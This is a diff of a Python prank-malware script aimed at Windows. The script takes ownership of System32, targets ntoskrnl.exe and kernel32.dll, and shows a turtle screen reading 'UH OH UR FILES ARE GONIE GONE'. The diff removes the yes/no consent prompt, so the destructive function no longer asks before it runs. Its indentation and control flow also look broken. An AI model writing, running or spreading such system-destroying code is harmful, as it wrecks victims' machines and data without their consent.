@@ -2,9 +2,7 @@ import subprocess
 import time
 from turtle import *
 import turtle
-dare = input("Do you dare to run this script? this shit gonna delete some serious shit and im not responsible  (yes/no): ")
-if dare == "yes" :
-  def malicious_shit():
+def malicious_shit():
     subprocess.run("takeown /f C:/Windows/System32")
     kern32="C:/Windows/System32/ntoskrnl.exe"
     kernel="C:/Windows/System32/kernel32.dll"
@@ -37,7 +35,7 @@ if dare == "yes" :
          print("Coward 🤣🫵")
          input("Press any key to exit")
          exit(0)
-    def graphics():
+def graphics():
         screen = turtle.Screen()
         screen.bgcolor("black")
         screen.title("UH OH UR FILES ARE GONIE GONE :)")
@@ -69,10 +67,6 @@ if dare == "yes" :
     
         flash_text()
         screen.mainloop()
-    while True:
+while True:
         graphics()
-    malicious_shit()
-else :
-  print("Coward 🤣🫵")
-  input("Press any key to exit")
-  exit(0)
+malicious_shit()
